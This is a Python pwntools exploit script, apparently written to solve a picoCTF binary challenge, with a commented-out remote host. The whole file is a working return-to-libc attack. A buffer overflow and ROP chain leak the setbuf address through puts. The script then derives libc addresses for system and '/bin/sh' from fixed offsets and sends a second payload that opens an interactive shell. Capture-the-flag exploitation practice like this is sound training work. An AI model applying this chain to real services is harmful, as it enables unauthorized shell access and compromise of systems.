#!/usr/bin/env python

from pwn import *

p = process('./patched_vuln')
# p = remote('mercury.picoctf.net', 23584)
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# gdb.attach(p)

p.recvuntil(b'VeR!\n')

junk = b"A"*136

# calling puts to leak the setbuf address in memory
puts_at_plt = 0x400540
# used ROPgadget tool to find this gadget
pop_rdi = 0x400913
setbuf_at_got = 0x601028
return_to_main = 0x400771

payload = [junk,
           p64(pop_rdi),
           p64(setbuf_at_got),
           p64(puts_at_plt),
           p64(return_to_main),
          ]

payload = b''.join(payload)

p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b"\x00"))
log.info(f"{hex(leak)=}")

# Now that we have the setbuf memory address
# we can get the system address and /bin/sh address as it's present in the libc only
setbuf_offset = 0x88540
libc_address = leak - setbuf_offset
log.info(f"{hex(libc_address)=}")

system_offset = 0x4f4e0
system_address = libc_address + system_offset
bin_sh_offset = 0x1b40fa
bin_sh_address = libc_address + bin_sh_offset
# below is used to fix the  stack alignment issue
stack_offset = 0x40052e

payload2 = [junk,
            p64(pop_rdi),
            p64(bin_sh_address),
            p64(stack_offset),
            p64(system_address),
           ]
payload2 = b''.join(payload2)
p.sendline(payload2)

p.interactive()
